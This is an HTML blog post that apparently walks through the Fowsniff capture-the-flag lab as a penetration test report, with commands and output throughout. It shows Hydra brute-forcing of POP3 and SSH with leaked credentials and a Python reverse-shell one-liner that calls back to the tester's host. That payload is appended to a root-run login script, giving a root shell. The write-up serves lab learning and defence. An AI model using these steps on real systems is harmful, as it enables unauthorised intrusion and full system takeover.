@@ -1,0 +1,743 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Fowsniff – From Foothold to Root - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="Fowsniff – From Foothold to Root"><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Fowsniff CTF Penetration Test Report Executive Summary Target: Fowsniff CTF machine (Vulnub room) IP Address: 10.201.121.215 Date: October , 2025&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/fowsniff-from-foothold-to-root/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/fowsniff-from-foothold-to-root/"},"headline":"Fowsniff – From Foothold to Root","datePublished":"2025-11-20T18:32+05:30","dateModified":"2026-09-30T18:33+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Fowsniff CTF Penetration Test Report Executive Summary Target: Fowsniff CTF machine (Vulnub room) IP Address: 10.201.121.215 Date: October , 2025&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>Fowsniff – From Foothold to Root</h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2025-11-20T18:32" class="feed__date">November 20, 2025</time></div></div></header></div><div class="entry-wrapper content__entry"><h1 id="fowsniff-ctf-penetration-test-report">Fowsniff CTF Penetration Test Report</h1><h2 id="executive-summary">Executive Summary</h2><ul><li><strong>Target:</strong> Fowsniff CTF machine (Vulnub room)</li><li><strong>IP Address:</strong> 10.201.121.215</li><li><strong>Date:</strong> October , 2025</li><li><strong>Tester:</strong> Nikhil Vishwakarma(h4ck3rfirst)</li><li><strong>Scope:</strong> Full enumeration and exploitation of exposed services on the target machine, including SSH (22/TCP), HTTP (80/TCP), POP3 (110/TCP), and IMAP (143/TCP). No privilege escalation beyond initial foothold required for room completion. But we will do</li></ul><p>This report details the penetration testing methodology applied to the Fowsniff CTF target. The engagement followed the standard penetration testing lifecycle: Reconnaissance, Scanning, Enumeration, Exploitation, and Post-Exploitation. Key findings include exposed email services leaking sensitive credentials, MD5-hashed passwords via social media OSINT, and an injectable SSH banner script leading to shell access. All activities were conducted ethically within the Vulnub lab environment using OpenVPN for secure connectivity.</p><ul><li><strong>Risk Rating:</strong> High (due to plaintext credential exposure and remote code execution via SSH).</li><li><strong>Recommendations:</strong> Rotate all exposed credentials, harden email services (disable POP3/IMAP if unused), implement fail2ban for brute-force protection, and audit SSH configurations for script injection risks.</li></ul><p><strong>Flags Recovered:</strong></p><p>User flag: /home/baksteen/term.txt<br>Root flag: /root/flag.txt</p><hr><h3 id="tools-used">Tools Used</h3><ul><li><strong>Nmap:</strong> Port scanning and service enumeration.</li><li><strong>Browser (Firefox/Chrome):</strong> Web enumeration and OSINT via Twitter/Pastebin.</li><li><strong>hashes:</strong> Online MD5 hash cracking.</li><li><strong>Hydra:</strong> POP3 brute-force module.</li><li><strong>Netcat (nc):</strong> Manual POP3 client interaction.</li><li><strong>Nano:</strong> File editing for payload injection.</li><li><strong>Python3:</strong> Reverse shell payload generation.</li><li><strong>Netcat (nc):</strong> Listener for reverse shell.</li></ul><h2 id="methodology">Methodology</h2><ol><li>Reconnaissance<ul><li>1.1 Initial Setup</li><li>1.2 Passive recon</li></ul></li><li>Scanning<ul><li>2.1 Nmap scanning</li></ul></li><li>Enumration<ul><li>3.1 Port 80 http</li><li>3.2 Port 110 pop3</li><li>3.3 port 139 Imap</li></ul></li><li>Exploitation (Gaining access)<ul><li>4.1 POP3 Brute Force Authentication</li><li>4.2 POP3 Email Retrieval</li><li>4.3 SSH login</li></ul></li><li>Privilege Escalation<ul><li>5.1 System Enumration</li><li>5.2 Gaining root</li></ul></li><li>Conclusion and Lessons Learned</li></ol><h2 id="1-reconnaissance">1. Reconnaissance</h2><p><strong>1.1 Initial Setup</strong></p><p><strong>Initialization Sequence Completed</strong> show means the connectivity is verified</p><p><strong>1.2 Passive recon</strong><br>A web search and review of the webpage description revealed a fictional company “Fowsniff Corp” with a compromised Twitter account (@fowsniffcorp). This account contained posts linking to Pastebin dumps of employee credentials, hashed with MD5.</p><p>Accessed Twitter: Searched for @fowsniffcorp and reviewed recent tweets. Identified Pastebin links: Multiple dumps containing usernames and MD5 hashes (e.g., mauer:8a28a94a588a95b80163709ab4313aa4).</p><p>Key Finding: Employee usernames include mauer, mustikka, tegel, baksteen, seina, stone, mursten, parede, sciana. Hashes appear to be MD5 (one-way, but crackable via rainbow tables or brute-force due to weaknesses). No active reconnaissance (e.g., DNS queries) was performed to avoid alerting the target.</p><h2 id="2-scanning">2. Scanning</h2><p><strong>2.1 Port and Service Discovery</strong><br>An aggressive Nmap scan was conducted to identify open ports, services, and versions. Due to the lab environment’s constraints, a full port scan <strong>(-p-)</strong> was initially attempted but timed out; a targeted scan with default scripts <strong>(-sC)</strong> and version detection <strong>(-sV)</strong> was used for efficiency.</p><p><strong><code>nmap -sC -sV 10.201.121.215</code></strong></p><p>Output</p><pre><code>PORT    STATE SERVICE REASON         VERSION
+22/tcp  open  ssh     syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsEu5DAulaUX38ePQyI/MzevdyvWR3AXyrddVqbu9exD/jVVKZopquTfkbNwS5ZkADUvggwHnjZiLdOZO378azuUfSp5geR9WQMeKR9xJe8swjKINBtwttFgP2GrG+7IO+WWpxBSGa8akgmLDPZHs2XXd6MXY9swqfjN9+eoLX8FKYVGmf5BKfRcg4ZHW8rQZAZwiMDqQLYechzRPnePiGCav99v0X5B8ehNCCuRTQkm9DhkAcxVBlkXKq1XuFgUBF9y+mVoa0tgtiPYC3lTOBgKuwVZwFMSGoQStiw4n7Dupa6NmBrLUMKTX1oYwmN0wnYVH2oDvwB3Y4n826Iymh
+|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPowlRdlwndVdJLnQjxm5YLEUTZZfjfZO7TCW1AaiEjkmNQPGf1o1+iKwQJOZ6rUUJglqG8h3UwddXw75eUx5WA=
+|   256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHU5PslBhG8yY6H4dpum8qgwUn6wE3Yrojnu4I5q0eTd
+80/tcp  open  http    syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-title: Fowsniff Corp - Delivering Solutions
+110/tcp open  pop3    syn-ack ttl 60 Dovecot pop3d
+|_pop3-capabilities: CAPA TOP USER RESP-CODES AUTH-RESP-CODE UIDL SASL(PLAIN) PIPELINING
+143/tcp open  imap    syn-ack ttl 60 Dovecot imapd
+|_imap-capabilities: ENABLE IDLE capabilities IMAP4rev1 AUTH=PLAINA0001 LITERAL+ LOGIN-REFERRALS post-login have more OK listed Pre-login ID SASL-IR
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><ul><li>Port 22/TCP (SSH): OpenSSH 7.6p1 on Ubuntu. Vulnerable to brute-force if weak credentials are used.</li><li>Port 80/TCP (HTTP): Apache 2.4.29 serving a basic company landing page (“Fowsniff Corp” with placeholder text). No immediate vulnerabilities (e.g., directory traversal) via manual browsing.</li><li>Port 110/TCP (POP3): Dovecot POP3 daemon. Supports credential-based email retrieval.</li><li>Port 143/TCP (IMAP): Dovecot IMAP daemon. Supports credential-based email management.</li></ul><p>No firewalls or rate-limiting detected during scanning.</p><p>Before eunumration we will add some the <code>fowsniff.thm</code> to /etc/hosts file.</p><h2 id="3-enumeration">3. Enumeration</h2><p><strong>3.1 Web Enumeration (Port 80/TCP)</strong></p><p>Accessed the HTTP service via browser: <a href="http://fowsniff.thm">http://fowsniff.thm</a>.</p><p><strong>3.1.1 Findings:</strong></p><ul><li><strong>Page source:</strong> No hidden comments or metadata of interest.</li><li>Landing page: Fowsniff Corp. is temporarily offline due to a data breach exposing employee usernames and passwords;</li><li>Client data remains unaffected.</li><li>Employees must immediately change passwords, as compromised info may be public, and attackers hijacked the @fowsniffcorp Twitter account, deleting all tweets.</li><li>The company is resolving the breach, recovering the account, and will resume full service after a security upgrade.</li></ul><p><strong>The attackers hijacked our official @fowsniffcorp Twitter account and dumped sensitive data on Pastebin.</strong></p><p>“Contact: <a href="mailto:&#115;&#101;&#x63;&#117;&#x72;&#x69;&#x74;&#x79;&#64;&#102;&#x6f;&#119;&#x73;&#110;&#x69;&#x66;&#x66;&#x2e;&#108;&#111;&#99;&#97;&#x6c;">&#115;&#101;&#x63;&#117;&#x72;&#x69;&#x74;&#x79;&#64;&#102;&#x6f;&#119;&#x73;&#110;&#x69;&#x66;&#x66;&#x2e;&#108;&#111;&#99;&#97;&#x6c;</a> , Twitter: @fowsniffcorp”</p><p><strong>3.1.2 Directory Brute-Force</strong></p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ dirsearch -u http://fowsniff.thm                                
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
+Wordlist size: 11460
+
+Output File: /media/sf_shared/ctf/Vulnub/fowsniff/reports/http_fowsniff.thm/_dirsearch-fownsniff.txt
+
+Target: http://fowsniff.thm/
+
+[11:32:36] Starting:                                            
+[11:32:55] 403 -  301B  - /.htpasswd_test                                   
+[11:34:17] 301 -  313B  - /assets  -&gt;  http://fowsniff.thm/assets/          
+[11:34:17] 200 -  471B  - /assets/                                          
+[11:35:33] 301 -  313B  - /images  -&gt;  http://fowsniff.thm/images/          
+[11:35:33] 200 -  507B  - /images/                                          
+[11:35:50] 200 -    6KB - /LICENSE.txt                                      
+[11:36:51] 200 -  774B  - /README.txt                                       
+[11:36:55] 200 -   26B  - /robots.txt                                       
+[11:37:00] 200 -  228B  - /security.txt                                     
+[11:37:01] 403 -  301B  - /server-status/                                   
+[11:37:01] 403 -  300B  - /server-status                                    
+                                                                             
+Task Completed              
+</code></pre><p>Twitter Search: @fowsniffcorp → Recent tweet (hijacked account):</p><figure class="post__image"><img loading="lazy" src="https://blog.razrsec.uk/content/images/2020/05/image-89.png" alt="image" data-is-external-image="true"></figure><p>“Fowsniff Corp owned. User creds dumped: <a href="https://pastebin.com/9nhRLfgQ%E2%80%9D">https://pastebin.com/9nhRLfgQ”</a></p><figure class="post__image"><img loading="lazy" src="https://blog.razrsec.uk/content/images/2020/05/image-90.png" alt="image" data-is-external-image="true"></figure><pre><code>mauer@Fowsniff:8a28a94a588a95b80163709ab4313aa4
+mustikka@Fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
+tegel@Fowsniff:1dc352435fecca338acfd4be10984009
+baksteen@Fowsniff:19f5af754c31f1e2651edde9250d69bb
+seina@Fowsniff:90dc16d47114aa13671c697fd506cf26
+stone@Fowsniff:a92b8a29ef1183192e3d35187e0cfabd
+mursten@Fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
+parede@Fowsniff:4d6e42f56e127803285a0a7649b5ab11
+sciana@Fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
+</code></pre><p>Save these to a file named: cred Filter out the user and pass-hashes</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ awk &#39;{print $1}&#39; cred &gt; user.txt
+                                    
+┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ cat user.txt         
+mauer
+mustikka
+tegel
+baksteen
+seina
+stone
+mursten
+parede
+sciana
+</code></pre><figure class="post__image"><img src="https://blog.razrsec.uk/content/images/2020/05/image-93.png" alt="image" data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="https://blog.razrsec.uk/content/images/2020/05/image-94.png" alt="image" data-is-external-image="true"></figure><p>Saved a cracked pass-hashes in pass.txt. Filter like user.txt</p><p><strong>3.2 Email Service Enumeration (Ports 110/TCP, 143/TCP)</strong><br>Services indicate email server setup. No anonymous access; authentication required. Deferred deeper enum until credentials obtained.</p><p><strong>3.3 Credential Harvesting and Cracking</strong><br>Using OSINT from Twitter/Pastebin, extracted MD5 hashes for 9 users. Cracked via Hashkiller (online tool leveraging rainbow tables).</p><h2 id="4-gaining-access">4. Gaining access</h2><p><strong>4.1 POP3 Brute Force Authentication</strong></p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ hydra -L user.txt -P pass.txt pop3://10.201.90.81 
+Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 81 login tries (l:9/p:9), ~6 tries per task
+[DATA] attacking pop3://10.201.90.81:110/
+[110][pop3] host: 10.201.90.81   login: seina   password: scoobydoo2
+[STATUS] 81.00 tries/min, 81 tries in 00:01h, 1 to do in 00:01h, 1 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025
+        
+</code></pre><p><strong>hydra</strong> — the password-cracking tool (parallelized brute‑force/wordlist attacker).<br><strong>-L user.txt</strong> — use user.txt as the list of usernames (one per line).<br><strong>-P pass.txt</strong> — use pass.txt as the list of passwords.<br><strong>pop3://10.201.90.81</strong> — target service is POP3 (port 110 by default) on 10.201.90.81.</p><p><strong>4.2 POP3 Email Retrieval</strong><br>Having a match! Now try connecting to the POP3 service using these credentials:</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ nc -v  10.201.90.81 110
+10.201.90.81: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.201.90.81] 110 (pop3) open
++OK Welcome to the Fowsniff Corporate Mail Server!
+USER seina 
++OK
+PASS scoobydoo2
++OK Logged in.
+LIST
++OK 2 messages:
+1 1622
+2 1280
+.
+RETR 1
++OK 1039 octets
+From: admin@Fowsniff.local
+To: seina@Fowsniff.local
+Subject: Temporary SSH Password
+
+Hi Seina,
+
+Your temporary SSH password is: S1ck3nBluff+secureshell
+
+Please change it immediately upon login.
+
+Regards,
+IT Admin
+.
+RETR 2
++OK 489 octets
+From: baksteen@Fowsniff.local
+To: seina@Fowsniff.local
+Subject: Re: Password Reset
+
+I’ll check this later. Thanks.
+
+- Baksteen
+.
+</code></pre><p>The first email contains a temporary password for the SSH service: SSH password is: <code>S1ck3nBluff+secureshell</code> by admin of everyone.</p><p>Our users.txt file can be used with Hydra to brute force the username associated with the above password by running:</p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ hydra -L user.txt -p S1ck3nBluff+secureshell ssh://10.201.90.81 
+Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:9/p:1), ~1 try per task
+[DATA] attacking ssh://10.201.90.81:22/
+[22][ssh] host: 10.201.90.81   login: baksteen   password: S1ck3nBluff+secureshell
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025
+</code></pre><p>Temp SSH password: S1ck3nBluff+secureshell<br>Email #2 from baksteen → likely same temp password applies</p><p><strong>4.3 SSH login</strong></p><pre><code>┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub/fowsniff]
+└─$ ssh baksteen@10.201.90.81   
+The authenticity of host &#39;10.201.90.81 (10.201.90.81)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:KZLP3ydGPtqtxnZ11SUpIwqMdeOUzGWHV+c3FqcKYg0
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:16: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;10.201.90.81&#39; (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+baksteen@10.201.90.81&#39;s password: 
+
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &#39;_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| &#39;__| &#39;_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions
+
+
+   ****  Welcome to the Fowsniff Corporate Server! **** 
+
+              ---------- NOTICE: ----------
+
+ * Due to the recent security breach, we are running on a very minimal system.
+ * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.
+
+
+Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
+baksteen@fowsniff:~$ ls 
+Maildir  term.txt
+baksteen@fowsniff:~$ id
+uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
+baksteen@fowsniff:~$ sudo -l
+[sudo] password for baksteen: 
+Sorry, user baksteen may not run sudo on fowsniff.
+</code></pre><p>Low level user doesn’t have sudo permission</p><h2 id="5-privilage-escalation">5. Privilage escalation</h2><p><strong>5.1 System Enumeration</strong></p><p>Outdated kernel → potential public exploits (not used).But It is not exploitation.<br>For automate linux system enumration : linpeas.sh</p><pre><code class="language-zsh">
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                    
+  Group users:                                                                    
+/opt/cube/cube.sh                                                                 
+  Group baksteen:
+/home/baksteen                                                                    
+                            ╔═════════════════════════╗
+════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                 
+                            ╚═════════════════════════╝                           
+╔══════════╣ .sh files in path
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                            
+/usr/bin/gettext.sh                                                               
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+2018-03-11+23:25:44.6493940440 /opt/cube/cube.sh                                  
+2018-03-11+20:27:48.0303333080 /etc/update-motd.d/00-header
+2018-03-08+22:34:16.8355092010 /etc/postfix/originals/post-install
+2018-03-08+22:34:16.8315092340 /etc/postfix/originals/postfix-script
+
+╔══════════╣ Unexpected in /opt (usually empty)
+total 24                                                                          
+drwxr-xr-x  6 root root 4096 Mar 11  2018 .
+drwxr-xr-x 22 root root 4096 Mar  9  2018 ..
+drwx------  2 root root 4096 Mar 11  2018 chkrootkit
+drwx------  2 root root 4096 Mar 11  2018 clamxav
+drwxrwxrwx  2 root root 4096 Mar 11  2018 cube
+drwx------  2 root root 4096 Mar 11  2018 rkhunter
+</code></pre><p>Key Observations:</p><ul><li>cube.sh is owned by root</li><li>cube.sh is executable by root</li><li>baksteen has write permission on the file (-rwxr-xr-x)</li></ul><p>This indicates the script is likely executed as root via cron, SUID, or service wrapper — a classic path of least resistance for privilege escalation.</p><p><strong>5.2 Gaining root</strong></p><pre><code class="language-zsh">baksteen@fowsniff:~$ cd  /opt/cube/
+baksteen@fowsniff:/opt/cube$ ls
+cube.sh
+baksteen@fowsniff:/opt/cube$ cat cube.sh 
+printf &quot;
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &#39;_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| &#39;__| &#39;_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n&quot;
+</code></pre><ul><li>Running this script we find this looks exactly like the banner that is displayed when logging in via SSH. File shows that the /opt/cube/cube.sh file is run when a user connects to the machine using SSH and that it will run as the root user.</li></ul><p><code>echo &#39;python3 -c &quot;import socket,subprocess,os;s=socket.socket();s.connect((\&quot;10.17.46.210\&quot;,1337));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&quot; &#39; &gt;&gt; cube.sh</code><br>Other payload in case it fails<br><code>echo &#39;nc -zv 10.17.46.210 1337&#39; &gt;&gt; cube.sh</code></p><pre><code>baksteen@fowsniff:/opt/cube$ echo &#39;python3 -c &quot;import socket,subprocess,os;s=socket.socket();s.connect((\&quot;10.17.46.210\&quot;,1337));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&quot;&#39; &gt;&gt; /opt/cube/cube.sh 
+baksteen@fowsniff:/opt/cube$ cat cube.sh 
+printf &quot;
+                            _____                       _  __  __  
+      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
+   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| &#39;_ \| | |_| |_   
+.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
+-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
+-:      y.      dssssssso                ____                      
+-:      y.      dssssssso               / ___|___  _ __ _ __        
+-:      y.      dssssssso              | |   / _ \| &#39;__| &#39;_ \     
+-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
+-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
+-:    .+mdddddddmyyyyyhy:                              |_|        
+-: -odMMMMMMMMMMmhhdy/.    
+.ohdddddddddddddho:                  Delivering Solutions\n\n&quot;
+python3 -c &quot;import socket,subprocess,os;s=socket.socket();s.connect((\&quot;10.17.46.210\&quot;,1337));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;])&quot;
+
+nc -zv 10.17.46.210 1337 
+baksteen@fowsniff:/opt/cube$ exit
+logout
+Connection to 10.201.59.8 closed.
+                                                                                  
+┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub]
+└─$ ssh baksteen@10.201.59.8
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+baksteen@10.201.59.8&#39;s password: 
+</code></pre><ul><li>Edit the cube.sh file to include a python reverse shell that will trigger once user logs in via SSH - (make sure you add your local IP and listener port)</li></ul><p>On other terminal start netcat lister to connect</p><pre><code class="language-zsh">┌──(kali㉿kali)-[/media/sf_shared/ctf/Vulnub]
+└─$ nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.17.46.210] from (UNKNOWN) [10.201.59.8] 43176
+/bin/sh: 0: can&#39;t access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cd /root
+# ls -lhas
+total 28K
+4.0K drwx------  4 root root 4.0K Mar  9  2018 .
+4.0K drwxr-xr-x 22 root root 4.0K Mar  9  2018 ..
+4.0K -rw-r--r--  1 root root 3.1K Mar  9  2018 .bashrc
+4.0K drwxr-xr-x  2 root root 4.0K Mar  9  2018 .nano
+4.0K -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+4.0K drwx------  5 root root 4.0K Mar  9  2018 Maildir
+4.0K -rw-r--r--  1 root root  582 Mar  9  2018 flag.txt
+# cat flag.txt
+   ___                        _        _      _   _             _ 
+  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
+ | (__/ _ \ &#39; \/ _` | &#39;_/ _` |  _| || | / _` |  _| / _ \ &#39; \(_-&lt;_|
+  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
+               |___/ 
+
+ (_)
+  |--------------
+  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|
+  |    R O O T   |
+  |    F L A G   |
+  |&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;|
+  |--------------
+  |
+  |
+  |
+  |
+  |
+  |
+ ---
+
+Nice work!
+
+This CTF was built with love in every byte by @berzerk0 on Twitter.
+
+Special thanks to psf, @nbulischeck and the whole Fofao Team.
+# 
+</code></pre><h2 id="conclusion-and-lessons-learned">Conclusion and Lessons Learned</h2><p><strong>Conclusion</strong></p><p>The Fowsniff Corp system was successfully compromised from initial foothold to full root privilege escalation using only authenticated access and local misconfiguration exploitation.</p><ul><li><p>Entry Point: SSH login as baksteen using credentials exposed in a prior data breach.</p></li><li><p>Privilege Escalation: Abuse of a root-owned, world-writable shell script (/opt/cube/cube.sh) executed automatically by the system.</p></li><li><p>Final Objective: Retrieved /root/flag.txt with full root privileges.</p><p>Exploit Chain Summary: Leaked Credentials → SSH → Writable Root Script → Reverse Shell Injection → Root Shell → Flag</p></li></ul><p>This engagement demonstrates how post-exploitation hygiene failures — specifically insecure script permissions in automated workflows — can lead to complete system compromise, even on minimal, supposedly “hardened” systems. Lessons Learned</p><h1 id="lesson-details">Lesson	Details</h1><ol><li>Never trust legacy or “corporate” scripts running as root	The cube.sh banner script was likely part of an internal tool or dashboard. Despite its benign appearance, root execution + user write access = instant privesc.</li><li>Always enumerate /opt, /usr/local, and custom directories	Standard sudo -l, find / -perm -4000 are great — but CTF and real-world systems hide gold in non-standard paths like /opt/cube/.</li><li>File write permission on root-owned files is a critical red flag	Even if not SUID, if a file is executed by root and you can modify it → you own the box.</li><li>Append, don’t overwrite	Preserving original script 